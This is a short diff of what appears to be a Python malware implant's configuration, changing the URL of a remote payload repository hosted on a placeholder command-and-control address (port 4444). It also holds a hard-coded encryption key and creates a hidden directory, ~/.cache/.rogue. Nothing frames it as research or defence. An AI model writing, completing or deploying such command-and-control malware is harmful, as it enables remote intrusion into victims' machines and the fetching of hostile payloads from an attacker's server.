@@ -6,7 +6,7 @@ import sys
 SECRET_KEY = b'Sixteen byte key'
 C2_HOST = 'YOUR.C2.IP.HERE'
 C2_PORT = 4444
-PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/payloads/"  # Remote repo
+PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/"  # Remote repo
 HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
 os.makedirs(HIDDEN_DIR, exist_ok=True)
 
